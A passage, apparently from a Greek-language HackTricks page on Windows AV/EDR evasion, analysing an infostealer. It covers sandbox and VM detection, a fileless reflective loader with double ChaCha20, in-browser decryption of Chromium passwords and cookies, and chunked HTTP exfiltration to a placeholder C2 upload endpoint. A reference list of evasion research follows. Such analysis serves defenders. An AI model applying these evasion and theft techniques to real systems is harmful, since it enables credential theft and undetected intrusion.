        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Διαστρωματωμένη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα προσαρμοσμένο κυλιόμενο checksum και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes· επαναλαμβάνει τον υπολογισμό του checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας όπως `C:\analysis`.
- Η παραλλαγή B ελέγχει ιδιότητες του συστήματος (ελάχιστο πλήθος διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να εντοπίσει τα additions του VirtualBox και εκτελεί χρονικούς ελέγχους γύρω από καθυστερήσεις για να εντοπίσει single-stepping. Αν εντοπιστεί κάτι, η εκτέλεση διακόπτεται πριν από την εκκίνηση των modules.

### Βοηθητικό εργαλείο χωρίς αρχεία + ανακλαστική φόρτωση διπλού ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα βοηθητικό εργαλείο Chromium για διαπιστευτήρια, το οποίο είτε αποθηκεύεται στον δίσκο είτε αντιστοιχίζεται χειροκίνητα στη μνήμη· στη λειτουργία χωρίς αρχεία, επιλύει μόνο του τα imports/relocations, ώστε να μην εγγράφονται αρχεία του βοηθητικού εργαλείου.
- Αυτό το βοηθητικό εργαλείο αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonces 12 byte). Μετά και τις δύο αποκρυπτογραφήσεις, φορτώνει ανακλαστικά το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν injection σε ένα ενεργό πρόγραμμα περιήγησης Chromium, να κληρονομήσουν κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τη σκλήρυνση ABE.


### Συλλογή στη μνήμη με modules και εξαγωγή δεδομένων μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, στιγμιότυπα οθόνης, έγγραφα, επεκτάσεις προγράμματος περιήγησης κ.λπ.). Κάθε thread εγγράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει τον αριθμό των αρχείων του μετά από περίοδο αναμονής join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Έπειτα, το `ThreadPayload1` περιμένει 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα όριο `multipart/form-data` προγράμματος περιήγησης (`----WebKitFormBoundary***`). Κάθε τμήμα προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται `complete: true`, ώστε το C2 να γνωρίζει ότι η επανασύνθεση έχει ολοκληρωθεί.

## References

- [1] [Προηγμένες τεχνικές αποφυγής εντοπισμού: Ακριβές module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ιστολόγιο](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στις ευκολίες για το malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC πλαστογράφησης call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και συσκότιση βασισμένη στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Απογραφή forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης βιβλιοθηκών δυναμικής σύνδεσης](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Σπάστε το προστατευτικό κέλυφος του Windows Defender με την τεχνική ανακατεύθυνσης φακέλου](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την καθαρή πρόσοψη: Από RAT σε builder και coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Ο SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση του malware Node.js με ανίχνευση API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Η Ωραία Κοιμωμένη: Θέτοντας το Adaptix σε αναστολή με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Η Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Απόκρυψη ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Ένας πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Οπλοποίηση του remediation driver του Defender ως primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία συναρτήσεων αυτοαπόκρυψης με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
